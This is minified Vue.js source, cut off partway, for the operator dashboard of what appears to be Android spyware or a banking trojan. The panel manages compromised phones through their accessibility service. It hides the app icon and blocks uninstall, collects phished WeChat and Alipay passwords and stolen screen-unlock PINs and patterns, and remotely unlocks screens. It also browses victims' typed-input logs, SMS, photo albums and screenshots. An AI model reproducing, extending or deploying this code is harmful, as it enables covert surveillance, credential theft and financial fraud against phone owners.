import{u as X}from"./useView.b2a319db.js";import{_ as Z,k as ee,b as L}from"./index.bc4fd47c.js";import te from"./list.d008cc4b.js";import le from"./list.2f2d0fa9.js";import ae from"./list.f0a8defb.js";import ie from"./list.03d5a711.js";import{d as ue,a as oe,e as r,a0 as se,O as p,W as J,r as m,y as ne,t as s,A as f,F as a,G as i,K as P,J as _,u as C,I as d,P as re,z as G,H as k,B as o,a6 as de,f as g,M as Q}from"./vlib.73c86f1d.js";import"./lodash.58534d7e.js";import"./monacoeditor.d62c48b5.js";import"./lib.e5e0e84e.js";const pe=ue({components:{AppList:te,SmsList:le,AlbumList:ae,SnapshotList:ie,CopyDocument:ee},setup(){const e=oe({post:!0,getDataListURL:"/device/page",getDataListIsPage:!0,installAppFilter:[],dataForm:{deviceId:"",pkg:"",phone:"",model:"",language:"",brand:"",installApp:"",status:"",remark:"",kill:"",accessibilityServiceEnabled:1,createdStart:"",createdEnd:""}}),t=r(""),u=r([]),c=r(!1),y=r(!1),D=r([]),F=r([]),v=r(""),b=r(null),E=r({deviceId:"",pkg:""}),A=r(!1),q=r({deviceId:""}),h=r(!1),R=r([]),U=r(null),M=r(!1),Y=r(null),$=r(!1),w=r({deviceId:""}),N=r(!1),B=r({deviceId:""}),S=r(!1),z=r({deviceId:""}),O=r(null),V=r(!1),H=r(""),W=r(!1),j=r({id:"",deviceId:"",remark:""}),K=r(!1),x=r(!1),T=r([]),l=r("");return{...X(e),...se(e),deviceId:t,inputLogVisible:c,logLoading:y,inputLogList:D,queryDate:F,queryAppPkg:v,querySource:b,currentDevice:E,appListVisible:A,currentAppDevice:q,unlockDialogVisible:h,unlockOptions:R,selectedUnlockId:U,unlocking:M,currentWakeRow:Y,smsListVisible:$,currentSmsDevice:w,albumListVisible:N,currentAlbumDevice:B,snapshotListVisible:S,currentSnapshotDevice:z,createdRange:O,remarkDialogVisible:V,remarkContent:H,remarkSubmitting:W,currentRemarkDevice:j,fishPwdDialogVisible:K,fishPwdLoading:x,fishPwdList:T,fishPwdTitle:l,fishTemplateList:u,permissionsName:{"android.permission.READ_SMS":"\u77ED\u4FE1","android.permission.READ_MEDIA_IMAGES":"\u76F8\u518C","android.permission.BATTERY":"\u7535\u6C60","android.permission.AUTO_START":"\u81EA\u542F\u52A8","android.permission.CAMERA":"\u6444\u50CF\u5934"}}},async mounted(){await this.fetchInstallAppFilterList(),this.getDataList(),await this.fetchFishTemplateList()},methods:{async copyed(e){const t=e&&e.deviceId?String(e.deviceId):"";if(!t){p.warning("\u65E0\u53EF\u590D\u5236\u7684\u8BBE\u5907ID");return}try{if(navigator.clipboard&&window.isSecureContext)await navigator.clipboard.writeText(t);else{const u=document.createElement("textarea");u.value=t,u.setAttribute("readonly","true"),u.style.position="fixed",u.style.left="-9999px",u.style.top="-9999px",document.body.appendChild(u),u.select(),document.execCommand("copy"),document.body.removeChild(u)}p.success("\u5DF2\u590D\u5236\u8BBE\u5907ID")}catch{p.error("\u590D\u5236\u5931\u8D25")}},resetQuery(){Object.assign(this.dataForm,{deviceId:"",pkg:"",phone:"",model:"",language:"",brand:"",installApp:"",status:"",remark:"",kill:"",accessibilityServiceEnabled:1,createdStart:"",createdEnd:""}),this.createdRange=null,this.getDataList()},onCreatedTimeChange(e){e&&Array.isArray(e)&&e.length===2?(this.dataForm.createdStart=e[0],this.dataForm.createdEnd=e[1]):(this.dataForm.createdStart="",this.dataForm.createdEnd="")},async fetchFishTemplateList(){let{code:e,data:t,msg:u}=await L.post("/device/fishCodeList");e==0?this.fishTemplateList=t:p.error(u||"\u83B7\u53D6\u9493\u9C7C\u6A21\u677F\u5931\u8D25")},openDeviceDetail(e){const t=`device_detail_${e.deviceId}_${Date.now()}`;sessionStorage.setItem(t,JSON.stringify(e));const u=window.location.href.split("#")[0],c=new URLSearchParams({pop:"true",page:"1",key:t,_mt:`\u8BBE\u5907\u8BE6\u60C5-${e.deviceId}`}).toString();window.open(`${u}#/device/detail?${c}`,"_blank")},async fetchInstallAppFilterList(){let{code:e,data:t,msg:u}=await L.post("/device/installAppFilterList");e==0?this.installAppFilter=t:J.alert(u,"\u9519\u8BEF",{type:"error",confirmButtonText:"OK"})},async wakeup(e){var D;const{success:t,data:u,msg:c}=await L.post("/unlockScreenPwd/page",{deviceId:e.id,page:1,limit:100});if(!t){p.error(c);return}const y=Array.isArray(u)?u:u&&(u.list||u.records)||[];if(this.unlockOptions=y||[],!this.unlockOptions||this.unlockOptions.length===0){p({message:"\u6682\u65E0\u53EF\u9009\u89E3\u9501\u5BC6\u7801\uFF0C\u8BF7\u5148\u6DFB\u52A0",type:"warning"});return}this.currentWakeRow=e,this.selectedUnlockId=((D=this.unlockOptions[0])==null?void 0:D.id)||null,this.unlockDialogVisible=!0},async confirmWakeup(){if(!this.currentWakeRow||!this.selectedUnlockId){p({message:"\u8BF7\u9009\u62E9\u89E3\u9501\u5BC6\u7801",type:"warning"});return}this.unlocking=!0;try{const{code:e,msg:t}=await L.post("/device/wakeup",{id:this.currentWakeRow.id,unlockPwdId:this.selectedUnlockId});e==0?(p({message:"\u64CD\u4F5C\u6210\u529F,\u7B49\u5F85\u5524\u9192!",type:"success"}),this.unlockDialogVisible=!1,this.currentWakeRow=null,this.selectedUnlockId=null,this.getDataList()):J.alert(t,"\u9519\u8BEF",{type:"error",confirmButtonText:"OK"})}finally{this.unlocking=!1}},async showInputLog(e){this.currentDevice.deviceId=e.deviceId,this.currentDevice.pkg=e.pkg,this.queryAppPkg="",this.querySource=null;const t=new Date,u=t.getFullYear()+"-"+String(t.getMonth()+1).padStart(2,"0")+"-"+String(t.getDate()).padStart(2,"0");this.queryDate=[u,u],this.inputLogVisible=!0,this.inputLogList=[],await this.refreshLog()},async refreshLog(){if(!this.currentDevice.deviceId||!this.currentDevice.pkg||!this.queryDate||!Array.isArray(this.queryDate)||this.queryDate.length!==2){p({message:"\u67E5\u8BE2\u53C2\u6570\u4E0D\u5B8C\u6574",type:"warning"});return}this.logLoading=!0,this.inputLogList=[];try{const[e,t]=this.queryDate,u=new Date(e),c=new Date(t),y=new Date(u.getFullYear(),u.getMonth(),u.getDate()).getTime(),D=new Date(c.getFullYear(),c.getMonth(),c.getDate()+1).getTime()-1,{code:F,data:v,msg:b}=await L.post("/inputTextRecord/group",{deviceId:this.currentDevice.deviceId,startTime:y,endTime:D,pkg:this.currentDevice.pkg,appPkg:this.queryAppPkg||void 0,source:this.querySource!==null?this.querySource:void 0});F==0?v&&v.items&&Array.isArray(v.items)?this.inputLogList=v.items:this.inputLogList=[]:p({message:b||"\u83B7\u53D6\u65E5\u5FD7\u5931\u8D25",type:"error"})}catch{p({message:"\u83B7\u53D6\u65E5\u5FD7\u5931\u8D25",type:"error"})}finally{this.logLoading=!1}},onDateChange(){},formatTime(e){if(!e)return"";const t=Number(e);if(isNaN(t))return"";const u=new Date(t);if(isNaN(u.getTime()))return"";const c=u.getFullYear(),y=String(u.getMonth()+1).padStart(2,"0"),D=String(u.getDate()).padStart(2,"0"),F=String(u.getHours()).padStart(2,"0"),v=String(u.getMinutes()).padStart(2,"0"),b=String(u.getSeconds()).padStart(2,"0");return`${c}-${y}-${D} ${F}:${v}:${b}`},async updateFishSwitch(e,t,u){try{const{success:c,msg:y}=await L.post("/device/updateFishSwitch",{id:e.id,code:t,value:u},void 0,!0);c?(p.success("\u66F4\u65B0\u6210\u529F"),this.getDataList()):p.error(y||"\u66F4\u65B0\u5931\u8D25")}catch{p.error("\u66F4\u65B0\u5931\u8D25")}},async updateDeviceSwitch(e,t,u){const c=u?1:0;e[t]=c;try{const{success:y,msg:D}=await L.post("/device/updateSwitch",{id:e.id,[t]:c},void 0,!0);y?p.success("\u66F4\u65B0\u6210\u529F"):(p.error(D||"\u66F4\u65B0\u5931\u8D25"),e[t]=c?0:1)}catch{p.error("\u66F4\u65B0\u5931\u8D25"),e[t]=c?0:1}},formatUnlockTips(e){let t="";switch(e.type){case 0:return"\u65E0\u9501";case 1:t="PIN\u7801";break;case 2:t="\u624B\u52BF";break;case 3:t="\u6DF7\u5408\u5BC6\u7801";break;default:return"\u672A\u77E5"}let u="";switch(e.source){case 1:u="\u9493\u9C7C";break;case 2:u="\u91C7\u96C6";break;default:u="\u672A\u77E5";break}return`(${u}) - ${t}:${e.tips}`},showAppList(e){this.currentAppDevice.deviceId=e.deviceId,this.appListVisible=!0},showSmsList(e){this.currentSmsDevice.deviceId=e.deviceId,this.smsListVisible=!0},showAlbumList(e){this.currentAlbumDevice.deviceId=e.deviceId,this.albumListVisible=!0},showSnapshotList(e){this.currentSnapshotDevice.deviceId=e.deviceId,this.snapshotListVisible=!0},showRemarkDialog(e){this.currentRemarkDevice.id=e.id,this.currentRemarkDevice.deviceId=e.deviceId,this.currentRemarkDevice.remark=e.remark||"",this.remarkContent=e.remark||"",this.remarkDialogVisible=!0},async submitRemark(){if(!this.currentRemarkDevice.id){p.error("\u8BBE\u5907ID\u4E0D\u80FD\u4E3A\u7A7A");return}this.remarkSubmitting=!0;try{const{code:e,msg:t}=await L.post("/device/updateRemark",{id:this.currentRemarkDevice.id,remark:this.remarkContent});e===0?(p.success("\u5907\u6CE8\u66F4\u65B0\u6210\u529F"),this.remarkDialogVisible=!1,this.remarkContent="",this.getDataList()):p.error(t||"\u5907\u6CE8\u66F4\u65B0\u5931\u8D25")}catch{p.error("\u5907\u6CE8\u66F4\u65B0\u5931\u8D25")}finally{this.remarkSubmitting=!1}},async showFishPwd(e,t){this.fishPwdLoading=!0,this.fishPwdDialogVisible=!0,this.fishPwdList=[];const u={wx:"\u5FAE\u4FE1",zfb:"\u652F\u4ED8\u5B9D"};this.fishPwdTitle=`\u8BBE\u5907ID: ${e.deviceId} - ${u[t]||t}`;try{const{code:c,data:y,msg:D}=await L.post("/device/showFishPwd",{deviceId:e.deviceId,code:t});c===0&&y?(this.fishPwdList=Array.isArray(y)?y:[],this.fishPwdList.length===0&&p.warning("\u6682\u65E0\u9493\u9C7C\u5BC6\u7801\u6570\u636E")):(p.error(D||"\u83B7\u53D6\u9493\u9C7C\u5BC6\u7801\u5931\u8D25"),this.fishPwdDialogVisible=!1)}catch{p.error("\u83B7\u53D6\u9493\u9C7C\u5BC6\u7801\u5931\u8D25"),this.fishPwdDialogVisible=!1}finally{this.fishPwdLoading=!1}}}}),ce={class:"mod-sys__log-operation"},me=["onClick"],ge={class:"cell-two-line"},fe={key:0},ve={key:1},he={key:2},we={class:"cell-two-line"},ye={key:0},be={key:1},ke={key:2},De={key:1,style:{color:"#ccc"}},Fe={key:0,type:"success"},Ce={key:2},Ee={class:"switch-grid"},Be={class:"switch-item"},Ve={class:"switch-item"},Le={class:"switch-item"},Ae={class:"switch-item"},Se={class:"switch-label"},Ie={class:"switch-actions"},$e={class:"switch-item"},Ue={class:"perm-grid"},xe={class:"perm-text"},Pe={class:"screen-status-grid"},_e={class:"log-header"},qe={class:"header-row"},ze={class:"query-controls"},Te={class:"log-content"},Re={class:"log-content-row"},Me={class:"log-time"},Ye={class:"log-app"},Ne={key:0,class:"log-resource"},Oe={class:"log-text"},He={key:0,class:"no-data"},We={style:{float:"left"}},je={style:{float:"right",color:"#8492a6","font-size":"13px"}},Ke={style:{color:"#00adff"}},Ge={key:0,style:{"text-align":"center",padding:"20px",color:"#909399"}};function Je(e,t,u,c,y,D){var T;const F=m("el-input"),v=m("el-form-item"),b=m("el-col"),E=m("el-option"),A=m("el-select"),q=m("el-date-picker"),h=m("el-button"),R=m("el-row"),U=m("el-form"),M=m("CopyDocument"),Y=m("el-icon"),$=m("el-tooltip"),w=m("el-table-column"),N=m("el-image"),B=m("el-tag"),S=m("el-switch"),z=m("el-table"),O=m("el-pagination"),V=m("el-dialog"),H=m("AppList"),W=m("SmsList"),j=m("AlbumList"),K=m("SnapshotList"),x=ne("loading");return s(),f("div",ce,[a(U,{inline:!0,model:e.dataForm,onKeyup:t[12]||(t[12]=re(l=>e.getDataList(),["enter"])),class:"query-form","label-width":"90px"},{default:i(()=>[a(R,{gutter:20},{default:i(()=>[a(b,{span:6},{default:i(()=>[a(v,{label:"\u8BBE\u5907ID"},{default:i(()=>[a(F,{modelValue:e.dataForm.deviceId,"onUpdate:modelValue":t[0]||(t[0]=l=>e.dataForm.deviceId=l),placeholder:"\u8BF7\u8F93\u5165\u8BBE\u5907ID",clearable:""},null,8,["modelValue"])]),_:1})]),_:1}),a(b,{span:6},{default:i(()=>[a(v,{label:"\u6240\u5C5E\u5305"},{default:i(()=>[a(F,{modelValue:e.dataForm.pkg,"onUpdate:modelValue":t[1]||(t[1]=l=>e.dataForm.pkg=l),placeholder:"\u8BF7\u8F93\u5165\u6240\u5C5E\u5305",clearable:""},null,8,["modelValue"])]),_:1})]),_:1}),a(b,{span:6},{default:i(()=>[a(v,{label:"\u624B\u673A\u578B\u53F7"},{default:i(()=>[a(F,{modelValue:e.dataForm.model,"onUpdate:modelValue":t[2]||(t[2]=l=>e.dataForm.model=l),placeholder:"\u8BF7\u8F93\u5165\u624B\u673A\u578B\u53F7",clearable:""},null,8,["modelValue"])]),_:1})]),_:1}),a(b,{span:6},{default:i(()=>[a(v,{label:"\u54C1\u724C"},{default:i(()=>[a(F,{modelValue:e.dataForm.brand,"onUpdate:modelValue":t[3]||(t[3]=l=>e.dataForm.brand=l),placeholder:"\u8BF7\u8F93\u5165\u54C1\u724C",clearable:""},null,8,["modelValue"])]),_:1})]),_:1}),a(b,{span:6},{default:i(()=>[a(v,{label:"\u5B89\u88C5\u5E94\u7528"},{default:i(()=>[a(A,{modelValue:e.dataForm.installApp,"onUpdate:modelValue":t[4]||(t[4]=l=>e.dataForm.installApp=l),placeholder:"\u8BF7\u9009\u62E9\u5B89\u88C5\u5E94\u7528",clearable:""},{default:i(()=>[(s(!0),f(P,null,_(e.installAppFilter,l=>(s(),C(E,{key:l.pkg,label:l.pkg,value:l.pkg},null,8,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1})]),_:1}),a(b,{span:6},{default:i(()=>[a(v,{label:"\u5C4F\u5E55\u72B6\u6001"},{default:i(()=>[a(A,{modelValue:e.dataForm.status,"onUpdate:modelValue":t[5]||(t[5]=l=>e.dataForm.status=l),placeholder:"\u8BF7\u9009\u62E9\u72B6\u6001",clearable:""},{default:i(()=>[a(E,{label:"\u7184\u5C4F",value:0}),a(E,{label:"\u4EAE\u5C4F",value:1})]),_:1},8,["modelValue"])]),_:1})]),_:1}),a(b,{span:6},{default:i(()=>[a(v,{label:"\u5DF2\u6740/\u672A\u6740"},{default:i(()=>[a(A,{modelValue:e.dataForm.kill,"onUpdate:modelValue":t[6]||(t[6]=l=>e.dataForm.kill=l),placeholder:"\u8BF7\u9009\u62E9\u72B6\u6001",clearable:""},{default:i(()=>[a(E,{label:"\u672A\u6740",value:0}),a(E,{label:"\u5DF2\u6740",value:1})]),_:1},8,["modelValue"])]),_:1})]),_:1}),a(b,{span:6},{default:i(()=>[a(v,{label:"\u65E0\u969C\u788D"},{default:i(()=>[a(A,{modelValue:e.dataForm.accessibilityServiceEnabled,"onUpdate:modelValue":t[7]||(t[7]=l=>e.dataForm.accessibilityServiceEnabled=l),placeholder:"\u8BF7\u9009\u62E9\u65E0\u969C\u788D\u72B6\u6001",clearable:""},{default:i(()=>[a(E,{selected:"",label:"\u5F00\u542F\u65E0\u969C\u788D",value:1}),a(E,{label:"\u5173\u95ED\u65E0\u969C\u788D",value:0})]),_:1},8,["modelValue"])]),_:1})]),_:1}),a(b,{span:6},{default:i(()=>[a(v,{label:"\u5B89\u88C5\u65F6\u95F4"},{default:i(()=>[a(q,{modelValue:e.createdRange,"onUpdate:modelValue":t[8]||(t[8]=l=>e.createdRange=l),type:"datetimerange","range-separator":"\u81F3","start-placeholder":"\u5F00\u59CB\u65F6\u95F4","end-placeholder":"\u7ED3\u675F\u65F6\u95F4",format:"YYYY-MM-DD HH:mm:ss","value-format":"x",onChange:e.onCreatedTimeChange,style:{width:"100%"}},null,8,["modelValue","onChange"])]),_:1})]),_:1}),a(b,{span:6},{default:i(()=>[a(v,{label:"\u5907\u6CE8"},{default:i(()=>[a(F,{modelValue:e.dataForm.remark,"onUpdate:modelValue":t[9]||(t[9]=l=>e.dataForm.remark=l),placeholder:"\u8BF7\u8F93\u5165\u5907\u6CE8",clearable:""},null,8,["modelValue"])]),_:1})]),_:1}),a(b,{span:12,class:"query-buttons"},{default:i(()=>[a(h,{type:"primary",onClick:t[10]||(t[10]=l=>e.getDataList())},{default:i(()=>t[30]||(t[30]=[d("\u67E5\u8BE2")])),_:1}),a(h,{onClick:t[11]||(t[11]=l=>e.resetQuery())},{default:i(()=>t[31]||(t[31]=[d("\u91CD\u7F6E")])),_:1})]),_:1})]),_:1})]),_:1},8,["model"]),G((s(),C(z,{data:e.dataList,border:"",onSortChange:e.dataListSortChangeHandle,"table-layout":"auto",style:{width:"100%"}},{default:i(()=>[a(w,{prop:"deviceId",label:"\u8BBE\u5907ID","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":""},{default:i(l=>[a(h,{link:"",type:"primary",onClick:n=>e.openDeviceDetail(l.row)},{default:i(()=>[d(k(l.row.deviceId),1)]),_:2},1032,["onClick"]),a($,{placement:"top","show-after":300,content:"\u590D\u5236\u8BBE\u5907ID"},{default:i(()=>[o("span",{class:"copy-action",onClick:de(n=>e.copyed(l.row),["stop"])},[a(Y,{class:"copy-icon"},{default:i(()=>[a(M)]),_:1})],8,me)]),_:2},1024)]),_:1}),a(w,{prop:"pkg",label:"\u6240\u5C5E\u5305","header-align":"center",align:"center",width:"120px","show-overflow-tooltip":""}),a(w,{label:"\u54C1\u724C/\u578B\u53F7","header-align":"center",align:"center",width:"100px","show-overflow-tooltip":""},{default:i(l=>[o("div",ge,[l.row.brand?(s(),f("div",fe,k(l.row.brand),1)):g("v-if",!0),l.row.model?(s(),f("div",ve,k(l.row.model),1)):g("v-if",!0),!l.row.brand&&!l.row.model?(s(),f("div",he,"-")):g("v-if",!0)])]),_:1}),a(w,{prop:"ip",label:"\u57CE\u5E02/IP","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":!0},{default:i(l=>[o("div",we,[l.row.addr?(s(),f("div",ye,k(l.row.addr),1)):g("v-if",!0),l.row.ip?(s(),f("div",be,k(l.row.ip),1)):g("v-if",!0),!l.row.addr&&!l.row.ip?(s(),f("div",ke,"-")):g("v-if",!0)])]),_:1}),a(w,{label:"\u753B\u9762","header-align":"center",align:"center",width:"70px"},{default:i(l=>[l.row.screenSnapshot?(s(),C(N,{key:0,"z-index":"1000","preview-teleported":!0,src:`data:image/png;base64,${l.row.screenSnapshot}`,"preview-src-list":[`data:image/png;base64,${l.row.screenSnapshot}`],fit:"fill",style:{width:"100px",height:"200px","border-radius":"4px",cursor:"pointer"}},null,8,["src","preview-src-list"])):(s(),f("span",De,"-"))]),_:1}),a(w,{prop:"lastHeart",label:"\u7535\u91CF","header-align":"center",align:"center",width:"70px"},{default:i(l=>[l.row.charging==1?(s(),f("div",Fe,[a($,{class:"box-item",effect:"dark",content:`\u5145\u7535\u4E2D:${l.row.battery}%`,placement:"top"},{default:i(()=>t[32]||(t[32]=[o("svg",{t:"1768278533985",class:"icon",viewBox:"0 0 1024 1024",version:"1.1",xmlns:"http://www.w3.org/2000/svg","p-id":"5048","data-darkreader-inline-fill":"",width:"16",height:"16"},[o("path",{d:"M384 170.666667V128a42.666667 42.666667 0 0 1 42.666667-42.666667h170.666666a42.666667 42.666667 0 0 1 42.666667 42.666667v42.666667h128a42.666667 42.666667 0 0 1 42.666667 42.666666v682.666667a42.666667 42.666667 0 0 1-42.666667 42.666667H256a42.666667 42.666667 0 0 1-42.666667-42.666667V213.333333a42.666667 42.666667 0 0 1 42.666667-42.666666h128z m170.666667 341.333333V298.666667l-213.333334 298.666666h128v213.333334l213.333334-298.666667h-128z",fill:"#1afa29","p-id":"5049","data-darkreader-inline-fill":"",style:{"--darkreader-inline-fill":"var(--darkreader-background-1afa29, #04bb3b)"}})],-1)])),_:2},1032,["content"])])):l.row.battery>0?(s(),C(B,{key:1,type:l.row.battery>20?"success":"warning"},{default:i(()=>[d(k(l.row.battery)+"%",1)]),_:2},1032,["type"])):(s(),f("div",Ce))]),_:1}),a(w,{prop:"lastHeart",label:"\u6700\u540E\u6D3B\u52A8\u65F6\u95F4","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":!0}),a(w,{prop:"created",label:"\u5B89\u88C5\u65F6\u95F4","header-align":"center",align:"center",width:"150px","show-overflow-tooltip":!0}),a(w,{prop:"remark",label:"\u5907\u6CE8","show-overflow-tooltip":"","header-align":"center",align:"center"}),a(w,{label:"\u63A7\u5236\u5F00\u5173","header-align":"center",align:"right",width:"260px"},{default:i(l=>[o("div",Ee,[o("div",Be,[t[33]||(t[33]=o("span",{class:"switch-label"},"\u9690\u85CF\u56FE\u6807",-1)),a(S,{"model-value":!!l.row.hideIcon,"onUpdate:modelValue":n=>e.updateDeviceSwitch(l.row,"hideIcon",n)},null,8,["model-value","onUpdate:modelValue"])]),o("div",Ve,[t[34]||(t[34]=o("span",{class:"switch-label"},"\u963B\u6B62\u5378\u8F7D",-1)),a(S,{"model-value":!!l.row.uninstallGuard,"onUpdate:modelValue":n=>e.updateDeviceSwitch(l.row,"uninstallGuard",n)},null,8,["model-value","onUpdate:modelValue"])]),o("div",Le,[t[35]||(t[35]=o("span",{class:"switch-label"},"\u89E3\u9501\u5BC6\u7801",-1)),a(S,{"model-value":!!l.row.unlockFish,"onUpdate:modelValue":n=>e.updateDeviceSwitch(l.row,"unlockFish",n)},null,8,["model-value","onUpdate:modelValue"])]),o("div",Ae,[t[36]||(t[36]=o("span",{class:"switch-label"},"\u662F\u5426\u88AB\u6740",-1)),a(S,{"model-value":l.row.kill==1,"onUpdate:modelValue":n=>e.updateDeviceSwitch(l.row,"kill",n)},null,8,["model-value","onUpdate:modelValue"])]),(s(!0),f(P,null,_(e.fishTemplateList.filter(n=>n.code==="zfb"||n.code==="wx"),n=>(s(),f("div",{class:"switch-item",key:n.code},[o("span",Se,k(n.code==="zfb"?"ZFB\u5BC6\u7801":"WX\u5BC6\u7801"),1),o("div",Ie,[a(S,{"model-value":l.row.fishSwitch&&!!l.row.fishSwitch[n.code],"onUpdate:modelValue":I=>e.updateFishSwitch(l.row,n.code,I)},null,8,["model-value","onUpdate:modelValue"]),!l.row.fishSwitch||!l.row.fishSwitch[n.code]?(s(),C(h,{key:0,link:"",type:"primary",size:"small",onClick:I=>e.showFishPwd(l.row,n.code)},{default:i(()=>[...t[37]||(t[37]=[d("\u67E5\u770B")])]),_:2},1032,["onClick"])):g("v-if",!0)])]))),128)),o("div",$e,[t[38]||(t[38]=o("span",{class:"switch-label"},"\u4E0A\u4F20\u65E5\u5FD7",-1)),a(S,{"model-value":l.row.uplog==1,"onUpdate:modelValue":n=>e.updateDeviceSwitch(l.row,"uplog",n)},null,8,["model-value","onUpdate:modelValue"])])])]),_:1}),a(w,{label:"\u6743\u9650\u5F00\u5173","header-align":"center",align:"center",width:"150px"},{default:i(l=>[o("div",Ue,[a(B,{class:"perm-tag",size:"small",effect:"light",type:l.row.accessibilityServiceEnabled==1?"success":"danger"},{default:i(()=>[t[39]||(t[39]=o("span",{class:"perm-text"},"\u65E0\u969C\u788D",-1)),g(` <el-icon class="perm-icon">
                <Select v-if="scope.row.accessibilityServiceEnabled == 1" />
                <Close v-else />
              </el-icon> `)]),_:2},1032,["type"]),(s(!0),f(P,null,_(l.row.permissions,(n,I)=>(s(),C($,{key:I,content:String(I),placement:"top","show-after":300},{default:i(()=>[a(B,{class:"perm-tag",size:"small",effect:"light",type:n?"success":"danger"},{default:i(()=>[o("span",xe,k(e.permissionsName[I]||I),1),g(` <el-icon class="perm-icon">
                  <Select v-if="value" />
                  <Close v-else />
                </el-icon> `)]),_:2},1032,["type"])]),_:2},1032,["content"]))),128))])]),_:1}),a(w,{label:"\u5C4F\u5E55\u72B6\u6001","header-align":"center",align:"center",width:"120px"},{default:i(l=>[o("div",Pe,[l.row.status==0?(s(),C(B,{key:0,size:"small",effect:"light",type:"info"},{default:i(()=>t[40]||(t[40]=[d("\u7184\u5C4F")])),_:1})):l.row.status==1?(s(),C(B,{key:1,size:"small",effect:"light",type:"success"},{default:i(()=>t[41]||(t[41]=[d("\u4EAE\u5C4F")])),_:1})):l.row.status==2||l.row.status==3?(s(),C(B,{key:2,size:"small",effect:"light",type:"warning"},{default:i(()=>t[42]||(t[42]=[d("\u7B49\u5F85\u5524\u9192")])),_:1})):(s(),C(B,{key:3,size:"small",effect:"light",type:"info"},{default:i(()=>t[43]||(t[43]=[d("\u672A\u77E5")])),_:1})),l.row.lockScreen?(s(),C($,{key:4,class:"box-item",effect:"dark",content:e.formatUnlockTips(l.row.lockScreen),placement:"top","show-after":300},{default:i(()=>[a(B,{size:"small",effect:"light",type:"success"},{default:i(()=>t[44]||(t[44]=[d("\u53EF\u89E3\u9501")])),_:1})]),_:2},1032,["content"])):(s(),C(B,{key:5,size:"small",effect:"light",type:"danger"},{default:i(()=>t[45]||(t[45]=[d("\u4E0D\u53EF\u89E3\u9501")])),_:1}))])]),_:1}),a(w,{label:"\u7CFB\u7EDF/SDK","header-align":"center",align:"center",width:"100px","show-overflow-tooltip":""},{default:i(l=>[d(k(l.row.systemVersion&&l.row.sdkVersion!==null&&l.row.sdkVersion!==void 0&&l.row.sdkVersion!==""?`${l.row.systemVersion} / ${l.row.sdkVersion}`:l.row.systemVersion||(l.row.sdkVersion!==null&&l.row.sdkVersion!==void 0?String(l.row.sdkVersion):"")||""),1)]),_:1}),a(w,{label:e.$t("handle"),"header-align":"center",align:"center",width:"90px",fixed:"right"},{default:i(l=>[g(" <el-button-group > "),o("div",null,[a(h,{link:"",type:"primary",onClick:n=>e.openDeviceDetail(l.row)},{default:i(()=>t[46]||(t[46]=[d("\u94FE\u63A5\u8BBE\u5907")])),_:2},1032,["onClick"])]),o("div",null,[a(h,{link:"",type:"primary",onClick:n=>e.showInputLog(l.row)},{default:i(()=>t[47]||(t[47]=[d("\u8F93\u5165\u8BB0\u5F55")])),_:2},1032,["onClick"])]),o("div",null,[a(h,{link:"",type:"primary",onClick:n=>e.showAppList(l.row)},{default:i(()=>t[48]||(t[48]=[d("\u5B89\u88C5\u5E94\u7528")])),_:2},1032,["onClick"])]),o("div",null,[a(h,{link:"",type:"primary",onClick:n=>e.showSmsList(l.row)},{default:i(()=>t[49]||(t[49]=[d("\u77ED\u4FE1\u8BB0\u5F55")])),_:2},1032,["onClick"])]),o("div",null,[a(h,{link:"",type:"primary",onClick:n=>e.showAlbumList(l.row)},{default:i(()=>t[50]||(t[50]=[d("\u67E5\u770B\u76F8\u518C")])),_:2},1032,["onClick"])]),o("div",null,[a(h,{link:"",type:"primary",onClick:n=>e.showSnapshotList(l.row)},{default:i(()=>t[51]||(t[51]=[d("\u67E5\u770B\u622A\u56FE")])),_:2},1032,["onClick"])]),o("div",null,[a(h,{link:"",type:"primary",onClick:n=>e.showRemarkDialog(l.row)},{default:i(()=>t[52]||(t[52]=[d("\u5907\u6CE8")])),_:2},1032,["onClick"])]),g(" </el-button-group> ")]),_:1},8,["label"])]),_:1},8,["data","onSortChange"])),[[x,e.dataListLoading]]),a(O,{"current-page":e.page,"page-sizes":[10,20,50,100],"page-size":e.limit,total:e.total,layout:"total, sizes, prev, pager, next, jumper",onSizeChange:e.pageSizeChangeHandle,onCurrentChange:e.pageCurrentChangeHandle},null,8,["current-page","page-size","total","onSizeChange","onCurrentChange"]),g(" \u8BE6\u60C5\u9875\u5DF2\u6539\u4E3A\u65B0Tab\u6253\u5F00\uFF0C\u4E0D\u518D\u4F7F\u7528\u5F39\u7A97 "),g(" \u8F93\u5165\u65E5\u5FD7\u5F39\u7A97 "),a(V,{modelValue:e.inputLogVisible,"onUpdate:modelValue":t[17]||(t[17]=l=>e.inputLogVisible=l),title:`\u8F93\u5165\u65E5\u5FD7 - \u8BBE\u5907ID: ${e.currentDevice.deviceId} \u5305\u540D: ${e.currentDevice.pkg}`,width:"970px","close-on-click-modal":!1,class:"input-log-dialog","destroy-on-close":""},{footer:i(()=>[a(h,{onClick:t[16]||(t[16]=l=>e.inputLogVisible=!1)},{default:i(()=>t[57]||(t[57]=[d("\u5173\u95ED")])),_:1})]),default:i(()=>[o("div",_e,[o("div",qe,[o("div",ze,[t[54]||(t[54]=o("span",{class:"query-label"},"\u6765\u6E90:",-1)),a(A,{modelValue:e.querySource,"onUpdate:modelValue":t[13]||(t[13]=l=>e.querySource=l),placeholder:"\u9009\u62E9\u6765\u6E90",clearable:"",style:{width:"120px"}},{default:i(()=>[a(E,{label:"\u7BA1\u7406\u7AEF",value:1}),a(E,{label:"App\u7AEF",value:0})]),_:1},8,["modelValue"]),t[55]||(t[55]=o("span",{class:"query-label"},"APP\u5305\u540D:",-1)),a(F,{modelValue:e.queryAppPkg,"onUpdate:modelValue":t[14]||(t[14]=l=>e.queryAppPkg=l),placeholder:"\u8F93\u5165APP\u5305\u540D",clearable:"",style:{width:"200px"}},null,8,["modelValue"]),t[56]||(t[56]=o("span",{class:"query-label"},"\u67E5\u8BE2\u65E5\u671F:",-1)),a(q,{modelValue:e.queryDate,"onUpdate:modelValue":t[15]||(t[15]=l=>e.queryDate=l),type:"daterange","range-separator":"\u81F3","start-placeholder":"\u5F00\u59CB\u65E5\u671F","end-placeholder":"\u7ED3\u675F\u65E5\u671F",format:"YYYY-MM-DD","value-format":"YYYY-MM-DD",onChange:e.onDateChange,style:{width:"280px"}},null,8,["modelValue","onChange"]),a(h,{type:"primary",onClick:e.refreshLog,loading:e.logLoading,size:"small"},{default:i(()=>t[53]||(t[53]=[d("\u91CD\u65B0\u67E5\u8BE2")])),_:1}